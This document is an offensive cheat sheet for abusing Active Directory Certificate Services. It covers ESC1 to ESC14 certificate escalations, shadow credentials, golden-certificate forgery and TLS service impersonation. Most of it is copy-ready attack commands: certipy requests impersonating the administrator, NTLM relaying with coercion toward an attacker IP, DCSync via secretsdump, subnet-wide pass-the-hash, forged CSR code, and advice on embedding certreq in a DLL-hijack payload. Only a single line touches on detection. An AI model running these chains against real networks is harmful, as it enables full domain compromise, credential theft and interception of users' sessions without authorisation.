# ADCS Certificate Abuse — ESC1-8 Attack Chains

---

## Enumeration

```bash
# certipy (Linux)
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable -stdout
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable -json -output adcs_output

# Certify (Windows)
.\Certify.exe find /vulnerable
.\Certify.exe cas              # enumerate CAs
.\Certify.exe templates        # all templates
```

Output shows: CA name, template name, ESC class, enrollment rights, vulnerable flags.

---

## ESC1 — Enrollee-Supplied SAN

Template allows enrollee to specify Subject Alternative Name → request cert as DA.

**Requirements**: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` on template + enrollment permission.

```bash
# Request cert with DA UPN in SAN
certipy req -u user@domain.local -p pass -ca '<CA-Name>' -template '<template>' \
  -upn administrator@domain.local -dc-ip <dc_ip>

# Certify (Windows) + Rubeus
.\Certify.exe request /ca:<CA-Name> /template:<template> /altname:administrator
# Convert .pem to .pfx: openssl pkcs12 -in cert.pem -keyex -CSP "RSA" -export -out cert.pfx

# Authenticate with cert → get TGT
certipy auth -pfx administrator.pfx -domain domain.local -username administrator -dc-ip <dc_ip>
# Outputs: NTLM hash + TGT (.ccache)

# Use NTLM hash for pass-the-hash
impacket-secretsdump domain.local/administrator@<dc_ip> -hashes :NTLM
```

---

## ESC2 — Any Purpose / SubCA Template

Template has `Any Purpose` EKU or no EKU → can be used for anything including client auth.

```bash
# Same flow as ESC1 — request with -upn flag
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<esc2-template>' \
  -upn administrator@domain.local
certipy auth -pfx administrator.pfx -domain domain.local -username administrator
```

---

## ESC3 — Certificate Request Agent

Enroll in template with `Certificate Request Agent` EKU → use that cert to enroll on behalf of any user in another template.

```bash
# Step 1: Get agent certificate
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<ESC3-Agent-Template>'

# Step 2: Enroll on behalf of DA using agent cert
certipy req -u user@domain.local -p pass -ca '<CA>' -template 'User' \
  -on-behalf-of domain\\administrator -pfx agent.pfx

# Authenticate
certipy auth -pfx administrator.pfx -domain domain.local -username administrator
```

---

## ESC4 — Writable Template ACL

Current user has `WriteProperty`/`WriteDacl`/`GenericAll` on template → modify it to allow ESC1.

```bash
# Modify template to add ENROLLEE_SUPPLIES_SUBJECT flag
certipy template -u user@domain.local -p pass -template '<template>' -save-old
certipy template -u user@domain.local -p pass -template '<template>' \
  -configuration '<CA>\<template>' -target <dc_ip>

# Now request as ESC1
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<template>' \
  -upn administrator@domain.local

# Restore original template
certipy template -u user@domain.local -p pass -template '<template>' -configuration old_template.json
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA

CA has this flag set → ANY template with client auth EKU allows enrollee-supplied SAN, even without the template flag.

```bash
# Check flag
certipy find ... | grep -i "EDITF_ATTRIBUTESUBJECTALTNAME2"

# Exploit: same as ESC1 — use any client auth template
certipy req -u user@domain.local -p pass -ca '<CA>' -template 'User' \
  -upn administrator@domain.local
certipy auth -pfx administrator.pfx -domain domain.local -username administrator
```

---

## ESC7 — CA Manager / Officer Rights

User has `ManageCA` or `ManageCertificates` right → enable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA (→ ESC6 chain).

```bash
# Enable flag
certipy ca -u user@domain.local -p pass -ca '<CA>' -enable-attribute-subjectaltname2 -target <dc_ip>

# Then exploit as ESC6
certipy req -u user@domain.local -p pass -ca '<CA>' -template 'SubCA' \
  -upn administrator@domain.local
```

---

## ESC8 — NTLM Relay to ADCS Web Enrollment

Relay NTLM auth to ADCS HTTP endpoint → obtain certificate for any relaying principal.

```bash
# Setup relay (see ntlm-relay.md)
impacket-ntlmrelayx -t http://<ADCS-host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication
python3 Coercer.py coerce -u user -p pass -d domain.local -t <dc_ip> -l <attacker_ip>

# ntlmrelayx outputs DC certificate → save dc.pfx

# Authenticate with DC cert
certipy auth -pfx dc.pfx -domain domain.local -username '<dc_hostname>$' -dc-ip <dc_ip>

# DCSync using TGT
impacket-secretsdump -k -no-pass domain.local/'<dc_hostname>$'@<dc_ip>
```

---

## Shadow Credentials

Write `msDS-KeyCredentialLink` attribute to target → authenticate as target via PKINIT (no cert template needed, no CA needed).

**Requirements**: `GenericWrite`/`GenericAll` on target account.

```bash
# certipy shadow
certipy shadow auto -u user@domain.local -p pass -account <target_user> -dc-ip <dc_ip>
# Outputs: NTLM hash of target_user

# Manual:
certipy shadow add -u user@domain.local -p pass -account <target_user> -dc-ip <dc_ip>
# → produces <target_user>.pfx
certipy auth -pfx <target_user>.pfx -domain domain.local -username <target_user> -dc-ip <dc_ip>
```

---

## Certificate authentication → credential extraction

```bash
# certipy auth → always produces both TGT and NTLM hash
certipy auth -pfx user.pfx -domain domain.local -username user -dc-ip <dc_ip>
# Output: user.ccache + NTLM hash printed

# Use TGT
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@<target>

# Use NTLM hash
impacket-secretsdump domain.local/user@<dc_ip> -hashes :NTLM
crackmapexec smb <subnet>/24 -u user -H NTLM --local-auth
```

---

## ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

Template has `msPKI-Enrollment-Flag` containing `CT_FLAG_NO_SECURITY_EXTENSION` (0x80000). Combined with weak certificate mapping (`StrongCertificateBindingEnforcement=0` or `CertificateMappingMethods=0x04`), allows impersonation via UPN manipulation.

**Requirements**: `GenericWrite` on target user + vulnerable mapping configuration on DC.

```bash
# 1. Write shadow credentials to get target's current state (optional backup)
# 2. Change target user's UPN to the impersonation target (e.g., administrator)
certipy shadow auto -u attacker@domain.local -p pass -account <victim_user> -dc-ip <dc_ip>

# 3. Request cert from vulnerable template (with NO_SECURITY_EXTENSION)
certipy req -u <victim_user>@domain.local -hashes :<victim_hash> -ca '<CA>' \
  -template '<ESC9-Template>' -dc-ip <dc_ip>

# 4. Change victim's UPN back to original
# 5. Authenticate with certificate — maps to administrator due to weak binding
certipy auth -pfx <victim_user>.pfx -domain domain.local -username administrator -dc-ip <dc_ip>
```

**Detection**: Monitor for UPN changes (Event ID 4738) followed by certificate enrollment.

---

## ESC10 — Weak Certificate Mapping (CertificateMappingMethods)

Two sub-cases depending on registry configuration:

### Case 1: StrongCertificateBindingEnforcement = 0

```bash
# Same flow as ESC9 — change target UPN, request cert, change back, authenticate
certipy account update -u attacker@domain.local -p pass -user <victim> -upn administrator@domain.local
certipy req -u <victim>@domain.local -p <victim_pass> -ca '<CA>' -template '<template>'
certipy account update -u attacker@domain.local -p pass -user <victim> -upn <victim>@domain.local
certipy auth -pfx administrator.pfx -domain domain.local -username administrator
```

### Case 2: CertificateMappingMethods includes UPN mapping (0x04)

Same approach — exploits the fact that SChannel authentication maps certificates to users based on UPN without verifying the SID in the certificate.

---

## ESC11 — NTLM Relay to ICPR (RPC Certificate Enrollment)

Similar to ESC8 but targets the RPC-based enrollment interface (MS-ICPR) instead of HTTP. Exploitable when the CA does not enforce `IF_ENFORCEENCRYPTICERTREQUEST` flag.

```bash
# Check if CA RPC interface lacks encryption enforcement
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable | grep -i "IF_ENFORCEENCRYPTICERTREQUEST"

# Setup relay to RPC endpoint
certipy relay -ca <ca_ip> -template DomainController

# Coerce authentication (PetitPotam/Coercer targeting DC)
python3 Coercer.py coerce -u user -p pass -d domain.local -t <dc_ip> -l <attacker_ip>

# Result: certificate issued for DC machine account → DCSync
certipy auth -pfx <dc_hostname>.pfx -domain domain.local -dc-ip <dc_ip>
impacket-secretsdump -k -no-pass domain.local/<dc_hostname>$@<dc_fqdn>
```

---

## ESC13 — Issuance Policy OID Group Link

Certificate template has an issuance policy OID that maps to a universal group. Enrolling in the template grants effective membership in that group via the certificate's policy extension.

**Requirements**: Enrollment rights on the vulnerable template + template has issuance policy linked to a privileged group.

```bash
# Identify ESC13 — certipy find shows linked group
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable -stdout | grep -A5 "ESC13"

# Enumerate the linked group (check what privileges it grants)
# The OID's msDS-OIDToGroupLink attribute points to a group DN

# Exploit: request certificate from vulnerable template
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<ESC13-Template>' -dc-ip <dc_ip>

# Authenticate — certificate grants group membership through issuance policy
certipy auth -pfx user.pfx -domain domain.local -username user -dc-ip <dc_ip>
```

---

## ESC14 — Explicit Certificate Mapping (altSecurityIdentities)

Abuses explicit certificate mapping configured via `altSecurityIdentities` attribute. If you can write to this attribute on a target, you can map your own certificate to authenticate as that target.

```bash
# Requires GenericWrite/GenericAll on target user/computer
# Write your certificate's mapping to target's altSecurityIdentities
certipy account update -u attacker@domain.local -p pass -user <target> \
  -altname "X509:<I>DC=local,DC=domain,CN=CA<S>CN=attacker"

# Authenticate with your existing certificate — now maps to target
certipy auth -pfx attacker.pfx -domain domain.local -username <target> -dc-ip <dc_ip>
```

---

## Golden Certificate (ESC5 — CA Key Compromise)

If the CA private key is compromised (admin access to CA server), forge any certificate indefinitely.

```bash
# Backup CA cert + private key (requires admin on CA)
certipy ca -backup -u admin@domain.local -p pass -ca '<CA-Name>' -target <ca_host>
# Outputs: ca.pfx

# Forge certificate for any user
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local -subject 'CN=Administrator,CN=Users,DC=domain,DC=local'
# Outputs: administrator_forged.pfx

# Authenticate
certipy auth -pfx administrator_forged.pfx -domain domain.local -username administrator -dc-ip <dc_ip>
```

**Persistence value**: survives krbtgt reset, user password changes. Only invalidated by CA re-key (extremely rare).

---

## ADCS for TLS Service Impersonation (non-PKINIT)

When a template has **EnrolleeSuppliesSubject + Server Authentication EKU** but **no Client Authentication EKU**, the issued cert cannot be used for PKINIT, Schannel LDAP auth, or PassTheCert. However, it is the exact material needed to impersonate any HTTPS service that clients validate against the enterprise CA trust chain.

### Target services

| Service | Typical hostname | Impact of impersonation |
|---------|-----------------|------------------------|
| WSUS | wsus.domain.local | Push arbitrary executables as SYSTEM updates |
| SCCM/MECM | sccm.domain.local | Deploy packages, run scripts as SYSTEM |
| ADFS | adfs.domain.local | Intercept SAML tokens, credential harvest |
| Internal web apps | app.domain.local | MitM authenticated sessions |

### Identification

```bash
# Find templates with ENROLLEE_SUPPLIES_SUBJECT + Server Auth EKU (not Client Auth)
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -stdout -enabled | \
  grep -A20 "ENROLLEE_SUPPLIES_SUBJECT" | grep -B5 "Server Authentication"
```

Key indicators:
- `Enrollee Supplies Subject: True`
- `Extended Key Usage: Server Authentication` (OID 1.3.6.1.5.5.7.3.1)
- **No** `Client Authentication` (OID 1.3.6.1.5.5.7.3.2)
- Enrollment rights: check which groups can enroll

### CSR generation (attacker keeps private key)

```python
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

pk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
open('svc_key.pem', 'wb').write(pk.private_bytes(
    serialization.Encoding.PEM,
    serialization.PrivateFormat.TraditionalOpenSSL,
    serialization.NoEncryption()))

csr = (x509.CertificateSigningRequestBuilder()
       .subject_name(x509.Name([
           x509.NameAttribute(NameOID.COMMON_NAME, '<target_hostname>')]))
       .add_extension(x509.SubjectAlternativeName([
           x509.DNSName('<target_hostname>'),
           x509.DNSName('<short_name>')]), critical=False)
       .sign(pk, hashes.SHA256()))
open('svc.csr', 'wb').write(csr.public_bytes(serialization.Encoding.DER))
```

### Submission via certreq (from Windows, as enrolled user)

```cmd
REM Submit CSR to CA with template specified in attributes (not INF)
certreq -f -submit -config "DC01.domain.local\CA-Name" ^
  -attrib "CertificateTemplate:<TemplateName>" ^
  C:\path\svc.csr C:\path\svc.cer < NUL

REM -f: overwrite without prompt
REM < NUL: prevent interactive prompts from blocking in automated contexts
```

### Alternative: DLL/script execution as enrolled user

When the enrolled user is accessed indirectly (e.g., via scheduled task DLL hijack), embed the certreq call in the payload. Critical flags:
- **`-f`**: prevents overwrite confirmation prompt
- **`< NUL`**: prevents stdin blocking in non-interactive contexts
- Both are mandatory when running inside a task/service that loops

### Build PFX and PEM for server use

```bash
# Combine CA-issued cert with attacker's private key
openssl pkcs12 -export -out svc.pfx -inkey svc_key.pem -in svc.cer -passout pass:
openssl pkcs12 -in svc.pfx -out svc_cert.pem -clcerts -nokeys -passin pass:
openssl pkcs12 -in svc.pfx -out svc_key_out.pem -nocerts -nodes -passin pass:

# Verify key matches cert
openssl x509 -in svc_cert.pem -noout -modulus | md5sum
openssl rsa -in svc_key.pem -noout -modulus | md5sum
# Must match

# Verify SAN
openssl x509 -in svc_cert.pem -noout -ext subjectAltName
```

### Next steps after cert acquisition

With a valid TLS cert for a service hostname:
1. Poison DNS (ADIDNS injection) → hostname resolves to attacker
2. Stand up rogue service with the cert (HTTPS on expected port)
3. Trigger client connection (WSUS scan, SCCM policy refresh, etc.)

→ Full WSUS attack chain: see [ad-services-abuse.md §Rogue WSUS](ad-services-abuse.md)

### Key distinction from ESC1

| | ESC1 (identity theft) | TLS impersonation |
|---|---|---|
| EKU needed | Client Authentication | Server Authentication |
| SAN content | UPN of target user | DNS name of target service |
| Result | Authenticate AS the target | Impersonate a service TO clients |
| Direct domain compromise | Yes (PKINIT → hash) | Indirect (SYSTEM exec via service abuse) |
